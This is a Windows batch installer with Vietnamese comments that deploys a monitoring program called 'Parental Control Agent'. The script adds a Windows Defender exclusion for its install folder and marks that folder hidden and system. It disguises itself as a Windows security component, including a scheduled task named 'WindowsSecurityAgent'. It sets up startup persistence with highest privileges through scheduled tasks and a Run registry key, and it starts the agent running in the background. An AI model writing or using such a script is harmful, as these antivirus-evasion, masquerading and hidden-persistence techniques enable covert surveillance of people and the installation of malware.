@echo off
:: PARENTAL CONTROL AGENT - SMART AUTO INSTALLER
:: Chi can chay file nay 1 lan duy nhat (Run as administrator)
chcp 65001 > nul
color 0A
title WINDOWS SECURITY COMPONENT INSTALLER

:: Kiem tra quyen Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Vui long chuot phai chon 'Run as administrator'!
    pause
    exit /b
)

set TARGET_DIR=C:\ProgramData\ParentalControl
set "SCRIPT_DIR=%~dp0"

echo.
echo ============================================================
echo   PARENTAL CONTROL AGENT - SMART INSTALLER
echo ============================================================
echo.

:: Dung tien trinh cu
echo [1/7] Dang dung chuong trinh cu (neu dang chay)...
taskkill /f /im ParentalControlAgent.exe >nul 2>&1
taskkill /f /im ParentalControlAgent_Debug.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Xoa task cu
echo [2/7] Xoa Task Scheduler cu...
schtasks /delete /tn "ParentalControlSystem" /f >nul 2>&1
schtasks /delete /tn "ParentalControlAgentTask" /f >nul 2>&1
schtasks /delete /tn "WindowsSecurityAgent" /f >nul 2>&1
timeout /t 1 /nobreak >nul

:: Tao thu muc dich & Them ngoai le Windows Defender
echo [3/7] Tao thu muc cai dat & cau hinh ngoai le Windows Defender...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Tim va copy file EXE tu dung vi tri
echo [4/7] Dang sao chep chuong trinh...

:: Thu 1: Cung thu muc voi file BAT nay
if exist "%SCRIPT_DIR%ParentalControlAgent.exe" (
    echo     Tim thay EXE trong cung thu muc...
    xcopy /E /Y /I "%SCRIPT_DIR%*" "%TARGET_DIR%\" >nul
    goto :files_copied
)

:: Thu 2: Thu muc con ParentalControlAgent\
if exist "%SCRIPT_DIR%ParentalControlAgent\ParentalControlAgent.exe" (
    echo     Tim thay EXE trong thu muc con ParentalControlAgent\...
    xcopy /E /Y /I "%SCRIPT_DIR%ParentalControlAgent\*" "%TARGET_DIR%\" >nul
    goto :files_copied
)

:: Thu 3: Thu muc dist\ParentalControlAgent\
if exist "%SCRIPT_DIR%dist\ParentalControlAgent\ParentalControlAgent.exe" (
    echo     Tim thay EXE trong dist\ParentalControlAgent\...
    xcopy /E /Y /I "%SCRIPT_DIR%dist\ParentalControlAgent\*" "%TARGET_DIR%\" >nul
    goto :files_copied
)

echo [!] KHONG TIM THAY ParentalControlAgent.exe!
echo     Vui long dat file BAT nay cung thu muc voi ParentalControlAgent.exe
pause
exit /b 1

:files_copied
echo     Sao chep thanh cong!

:: An thu muc
echo [5/7] Cau hinh bao mat he thong...
attrib +h +s "%TARGET_DIR%" >nul 2>&1

:: Dang ky Task Scheduler & Registry (chay khi khoi dong he thong va khi dang nhap)
echo [6/7] Dang ky khoi dong tu dong...
schtasks /create /tn "WindowsSecurityAgent" /tr "\"%TARGET_DIR%\ParentalControlAgent.exe\"" /sc onstart /rl highest /f >nul 2>&1
schtasks /create /tn "ParentalControlSystem" /tr "\"%TARGET_DIR%\ParentalControlAgent.exe\"" /sc onlogon /ru "%USERNAME%" /rl highest /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ParentalControlAgent" /t REG_SZ /d "\"%TARGET_DIR%\ParentalControlAgent.exe\"" /f >nul 2>&1

:: Khoi chay ngay lap tuc
echo [7/7] Dang khoi chay Agent...
if exist "%TARGET_DIR%\ParentalControlAgent.exe" (
    start "" "%TARGET_DIR%\ParentalControlAgent.exe"
    echo     Agent da khoi dong!
) else (
    echo [!] Loi: Khong tim thay EXE tai %TARGET_DIR%
    pause
    exit /b 1
)

echo.
echo ============================================================
echo   CAI DAT HOAN TAT THANH CONG!
echo   Agent dang chay ngam va se tu dong bat cung Windows.
echo ============================================================
echo.
timeout /t 5 /nobreak >nul
exit /b 0
